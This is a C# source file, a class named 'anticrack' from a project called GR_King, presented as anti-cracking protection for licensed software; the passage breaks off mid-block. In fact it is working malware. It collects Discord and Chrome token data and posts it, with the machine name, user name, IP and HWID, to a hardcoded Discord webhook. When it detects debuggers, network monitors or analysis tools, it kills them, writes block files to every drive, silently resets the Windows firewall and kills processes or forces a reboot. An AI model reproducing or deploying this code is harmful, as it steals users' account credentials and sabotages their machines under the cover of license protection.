using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;
using System.Timers;
using System.Net.Http;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using GR_King.Properties;
using System.Threading.Tasks;

namespace GR_King
{
    class anticrack
    {
        public static void checkblockeduser()
        {

            if (File.Exists("C:\\Windows\\Fonts\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("C:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("D:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("E:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("F:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("G:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("H:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("I:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("J:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("K:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("L:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else if (File.Exists("M:\\.cd"))
            {
                _ = MessageBox.Show("Bye Bye :)", "Fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }

        }
        public static void Start()
        {
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 2500;
            timer.Elapsed += Call;
            timer.Start();

        }

        static void Call(object sender, ElapsedEventArgs e)
        {
            anticrack.FUCKING();
        }

        #region [ FUCK ]
        private static string _hookUrl = "https://discordapp.com/api/webhooks/759803038436556831/6zqraszucF2bvYRKNPUqahiau0w2op11WegVqx_8lqNAg3rpBDu04nkM8ggy8yUR0tTf";
        public static List<string> WW = new List<string>();
        private static string PR;

        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"T Report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "T OF " + Environment.UserName },
                        { "avatar_url", "https://img2.pngdownload.id/20180715/qeh/kisspng-white-hat-security-hacker-black-hat-briefings-comp-white-hat-hacker-icon-5b4b6fa28c83a9.7431898115316704345756.jpg" }
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }

        public static List<string> TokenReport = new List<string>();
        private static string Di = "Discord";
        private static string di = "discord";
        private readonly static List<Service> _services = new List<Service>()
        {
            new Service(Di, @"Roaming\"+Di+""),
            new Service(Di+" Canary", @"Roaming\"+di+"canary", true),
            new Service(Di+" PTB", @"Roaming\"+di+"ptb"),
            new Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
        };
        public static void Sendtoken()
        {
            foreach (var service in _services)
                service.GetTokens();

            if (crack.TokensFound)
                anticrack.ReportTokens(TokenReport);
        }
        #endregion
        public static void SEND(List<string> WW)
        {
            HttpClient httpClient = new HttpClient();
            Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
            {
                {
                    "content",
                    string.Concat(new string[]
                    {
                        "```USER PC : ", Environment.MachineName, "\r\n",

                        "\r\nUSER NAME : ", Environment.UserName,

                        "\n\nUser IP : ", Info.IP,

                        "\n\nUser HWID : ", Info.HWID,

                        "\n\nUser KEY : ", Info.Username,

                        "\n\nUser ID : ", Info.License,

                        "\n\nKey Expire : ", Info.Expires,

                        "\n\nCracker TOOL : ", PR,

                        "\n\n--------------------------------------------- ```",


                        string.Join("\n", WW)
                    })
                },
                {
                    "username",
                     "Detected In = " + Auth.appName
                },
                {
                    "avatar_url",
                    "https://img2.pngdownload.id/20180715/qeh/kisspng-white-hat-security-hacker-black-hat-briefings-comp-white-hat-hacker-icon-5b4b6fa28c83a9.7431898115316704345756.jpg"
                }
            };

            httpClient.PostAsync(_hookUrl, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
        }
        public static void restart()
        {
            Process[] processess = Process.GetProcesses();

            foreach (var process in processess)
            {
                try
                {
                    Console.WriteLine(process.ProcessName);
                    process.PriorityClass = ProcessPriorityClass.BelowNormal;
                    process.Kill();
                }
                catch
                {
                    Process.Start("shutdown.exe", "-r -t 0");
                }

            }

        }

        public static void ResetfirewallAndBlockUser()
        {

            try { File.WriteAllBytes("C:\\Windows\\Fonts\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("C:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("D:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("E:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("F:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("G:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("H:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("I:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("J:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("K:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("L:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("M:\\.cd", Resources._cd); } catch { }
            try { File.WriteAllBytes("N:\\.cd", Resources._cd); } catch { }

            Task.Delay(2000).Wait();

            string str312 = "netsh advfirewall reset";
            Interaction.Shell("cmd /c" + str312, AppWinStyle.Hide, true, -1);
            restart();

        }

        public static void resetfirewall()
        {
            string str312 = "netsh advfirewall reset";
            Interaction.Shell("cmd /c" + str312, AppWinStyle.Hide, true, -1);
        }
        public static void FUCKING()
        {


            #region [ Monitors ]
            var key = Registry.CurrentUser.OpenSubKey(@"Software\Sysinternals\Process Explorer");
            if (key == null)
            {
                // Not exists
            }
            else
            {
                Sendtoken();
                ResetfirewallAndBlockUser();
                restart();
                //Application.Exit();
                Environment.Exit(0);
            }
            var key1 = Registry.CurrentUser.OpenSubKey(@"Software\Sysinternals\Process Monitor");
            if (key1 == null)
            {
                // Not exists
            }
            else
            {
                Sendtoken();
                ResetfirewallAndBlockUser();
                restart();
                //Application.Exit();
                Environment.Exit(0);
            }
            #endregion

            #region [ ProcessChecker ]
            try
            {
                foreach (Process process01 in Process.GetProcessesByName("cmd"))
                {
                    process01.Kill();
                }
                foreach (Process process01 in Process.GetProcessesByName("adb"))
                {
                    process01.Kill();
                }
                foreach (Process process01 in Process.GetProcessesByName("mmc"))
                {
                    process01.Kill();
                    PR = process01.ProcessName;
                    SEND(WW);
                    _ = MessageBox.Show("Dont Open Firewall When Running this App", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                }
                foreach (Process process02 in Process.GetProcessesByName("ProcessHacker"))
                {
                    process02.Kill();
                    PR = process02.ProcessName;
                    //API.log(Auth.appName, process57.ProcessName);
                    SEND(WW);
                    resetfirewall();
                    //Application.Exit();
                    Environment.Exit(0);

                }
                foreach (Process process03 in Process.GetProcessesByName("ILSpy"))
                {
                    process03.Kill();
                    PR = process03.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("sharpod"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("strongod"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("PhantOm"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("titanHide"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("scyllaHide"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("graywolf"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("simpleassemblyexplorer"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("X64NetDumper"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("proxifier"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processt in Process.GetProcessesByName("mitmproxy"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }

                foreach (Process processt in Process.GetProcessesByName("Process Monitor"))
                {
                    processt.Kill();
                    PR = processt.ProcessName;
                    //API.log(Auth.appName, processt.ProcessName); enable if using auth.gg
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processtt in Process.GetProcessesByName("Procmon64"))
                {
                    processtt.Kill();
                    PR = processtt.ProcessName;
                    //API.log(Auth.appName, processtt.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process58 in Process.GetProcessesByName("Procmon"))
                {
                    process58.Kill();
                    PR = process58.ProcessName;
                    //API.log(Auth.appName, process58.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process59 in Process.GetProcessesByName("Procmon32"))
                {
                    process59.Kill();
                    PR = process59.ProcessName;
                    //API.log(Auth.appName, process59.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processk in Process.GetProcessesByName("ProcMonX"))
                {
                    processk.Kill();
                    PR = processk.ProcessName;
                    //API.log(Auth.appName, processk.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processkk in Process.GetProcessesByName("apimonitor-x86"))
                {
                    processkk.Kill();
                    PR = processkk.ProcessName;
                    //API.log(Auth.appName, processkk.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processll in Process.GetProcessesByName("apimonitor-x64"))
                {
                    processll.Kill();
                    PR = processll.ProcessName;
                    //API.log(Auth.appName, processll.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processmm in Process.GetProcessesByName("SpyStudio"))
                {
                    processmm.Kill();
                    PR = processmm.ProcessName;
                    //API.log(Auth.appName, processmm.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processnn in Process.GetProcessesByName("x32dbg"))
                {
                    processnn.Kill();
                    PR = processnn.ProcessName;
                    //API.log(Auth.appName, processnn.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processoo in Process.GetProcessesByName("x64dbg"))
                {
                    processoo.Kill();
                    PR = processoo.ProcessName;
                    //API.log(Auth.appName, processoo.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processpp in Process.GetProcessesByName("dnSpy-x86"))
                {
                    processpp.Kill();
                    PR = processpp.ProcessName;
                    //API.log(Auth.appName, processpp.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processqq in Process.GetProcessesByName("dnSpy-x64"))
                {
                    processqq.Kill();
                    PR = processqq.ProcessName;
                    //API.log(Auth.appName, processqq.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process processgg in Process.GetProcessesByName("ollydbg"))
                {
                    processgg.Kill();
                    PR = processgg.ProcessName;
                    //API.log(Auth.appName, processgg.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process3 in Process.GetProcessesByName("ida64"))
                {
                    process3.Kill();
                    PR = process3.ProcessName;
                    //API.log(Auth.appName, process3.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process4 in Process.GetProcessesByName("idag"))
                {
                    process4.Kill();
                    PR = process4.ProcessName;
                    //API.log(Auth.appName, process4.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process5 in Process.GetProcessesByName("idag64"))
                {
                    process5.Kill();
                    PR = process5.ProcessName;
                    //API.log(Auth.appName, process5.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process6 in Process.GetProcessesByName("idaw"))
                {
                    process6.Kill();
                    PR = process6.ProcessName;
                    //API.log(Auth.appName, process6.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process7 in Process.GetProcessesByName("idaw64"))
                {
                    process7.Kill();
                    PR = process7.ProcessName;
                    //API.log(Auth.appName, process7.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process8 in Process.GetProcessesByName("idaq"))
                {
                    process8.Kill();
                    PR = process8.ProcessName;
                    //API.log(Auth.appName, process8.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process9 in Process.GetProcessesByName("idaq64"))
                {
                    process9.Kill();
                    PR = process9.ProcessName;
                    //API.log(Auth.appName, process9.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process10 in Process.GetProcessesByName("idau"))
                {
                    process10.Kill();
                    PR = process10.ProcessName;
                    //API.log(Auth.appName, process10.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process11 in Process.GetProcessesByName("idau64"))
                {
                    process11.Kill();
                    PR = process11.ProcessName;
                    //API.log(Auth.appName, process11.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process12 in Process.GetProcessesByName("scylla"))
                {
                    process12.Kill();
                    PR = process12.ProcessName;
                    //API.log(Auth.appName, process12.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process13 in Process.GetProcessesByName("scylla_x64"))
                {
                    process13.Kill();
                    PR = process13.ProcessName;
                    //API.log(Auth.appName, process13.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process14 in Process.GetProcessesByName("scylla_x86"))
                {
                    process14.Kill();
                    PR = process14.ProcessName;
                    //API.log(Auth.appName, process14.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process15 in Process.GetProcessesByName("protection_id"))
                {
                    process15.Kill();
                    PR = process15.ProcessName;
                    //API.log(Auth.appName, process15.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process18 in Process.GetProcessesByName("windbg"))
                {
                    process18.Kill();
                    PR = process18.ProcessName;
                    //API.log(Auth.appName, process18.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process19 in Process.GetProcessesByName("reshacker"))
                {
                    process19.Kill();
                    PR = process19.ProcessName;
                    //API.log(Auth.appName, process19.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process20 in Process.GetProcessesByName("ImportREC"))
                {
                    process20.Kill();
                    PR = process20.ProcessName;
                    //API.log(Auth.appName, process20.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process21 in Process.GetProcessesByName("IMMUNITYDEBUGGER"))
                {
                    process21.Kill();
                    PR = process21.ProcessName;
                    //API.log(Auth.appName, process21.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process22 in Process.GetProcessesByName("MegaDumper"))
                {
                    process22.Kill();
                    PR = process22.ProcessName;
                    //API.log(Auth.appName, process22.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process23 in Process.GetProcessesByName("OLLYDBG"))
                {
                    process23.Kill();
                    PR = process23.ProcessName;
                    //API.log(Auth.appName, process23.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process24 in Process.GetProcessesByName("ida"))
                {
                    process24.Kill();
                    PR = process24.ProcessName;
                    //API.log(Auth.appName, process24.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process25 in Process.GetProcessesByName("disassembly"))
                {
                    process25.Kill();
                    PR = process25.ProcessName;
                    //API.log(Auth.appName, process25.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process27 in Process.GetProcessesByName("Debug"))
                {
                    process27.Kill();
                    PR = process27.ProcessName;
                    //API.log(Auth.appName, process27.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process28 in Process.GetProcessesByName("[CPU"))
                {
                    process28.Kill();
                    PR = process28.ProcessName;
                    //API.log(Auth.appName, process28.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process29 in Process.GetProcessesByName("Immunity"))
                {
                    process29.Kill();
                    PR = process29.ProcessName;
                    //API.log(Auth.appName, process29.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process30 in Process.GetProcessesByName("WinDbg"))
                {
                    process30.Kill();
                    PR = process30.ProcessName;
                    //API.log(Auth.appName, process30.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process33 in Process.GetProcessesByName("Import reconstructor"))
                {
                    process33.Kill();
                    PR = process33.ProcessName;
                    //API.log(Auth.appName, process33.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process35 in Process.GetProcessesByName("MegaDumper 1. by CodeCracker / SnD"))
                {
                    process35.Kill();
                    PR = process35.ProcessName;
                    //API.log(Auth.appName, process35.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process36 in Process.GetProcessesByName("codecracker"))
                {
                    process36.Kill();
                    PR = process36.ProcessName;
                    //API.log(Auth.appName, process36.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process39 in Process.GetProcessesByName("ollydbg"))
                {
                    process39.Kill();
                    PR = process39.ProcessName;
                    //API.log(Auth.appName, process39.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process40 in Process.GetProcessesByName("ida -"))
                {
                    process40.Kill();
                    PR = process40.ProcessName;
                    //API.log(Auth.appName, process40.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process41 in Process.GetProcessesByName("charles"))
                {
                    process41.Kill();
                    PR = process41.ProcessName;
                    //API.log(Auth.appName, process41.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process42 in Process.GetProcessesByName("dnspy"))
                {
                    process42.Kill();
                    PR = process42.ProcessName;
                    //API.log(Auth.appName, process42.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process43 in Process.GetProcessesByName("simpleassembly"))
                {
                    process43.Kill();
                    PR = process43.ProcessName;
                    //API.log(Auth.appName, process43.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process44 in Process.GetProcessesByName("peek"))
                {
                    process44.Kill();
                    PR = process44.ProcessName;
                    //API.log(Auth.appName, process44.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process45 in Process.GetProcessesByName("httpanalyzer"))
                {
                    process45.Kill();
                    PR = process45.ProcessName;
                    //API.log(Auth.appName, process45.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process46 in Process.GetProcessesByName("httpdebug"))
                {
                    process46.Kill();
                    PR = process46.ProcessName;
                    //API.log(Auth.appName, process46.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process47 in Process.GetProcessesByName("fiddler"))
                {
                    process47.Kill();
                    PR = process47.ProcessName;
                    //API.log(Auth.appName, process47.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process48 in Process.GetProcessesByName("wireshark"))
                {
                    process48.Kill();
                    PR = process48.ProcessName;
                    //API.log(Auth.appName, process48.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process49 in Process.GetProcessesByName("dbx"))
                {
                    process49.Kill();
                    PR = process49.ProcessName;
                    //API.log(Auth.appName, process49.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process50 in Process.GetProcessesByName("mdbg"))
                {
                    process50.Kill();
                    PR = process50.ProcessName;
                    //API.log(Auth.appName, process50.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process51 in Process.GetProcessesByName("gdb"))
                {
                    process51.Kill();
                    PR = process51.ProcessName;
                    //API.log(Auth.appName, process51.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process52 in Process.GetProcessesByName("windbg"))
                {
                    process52.Kill();
                    PR = process52.ProcessName;
                    //API.log(Auth.appName, process52.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process53 in Process.GetProcessesByName("dbgclr"))
                {
                    process53.Kill();
                    PR = process53.ProcessName;
                    //API.log(Auth.appName, process53.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process54 in Process.GetProcessesByName("kdb"))
                {
                    process54.Kill();
                    PR = process54.ProcessName;
                    //API.log(Auth.appName, process54.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process55 in Process.GetProcessesByName("kgdb"))
                {
                    process55.Kill();
                    PR = process55.ProcessName;
                    //API.log(Auth.appName, process55.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
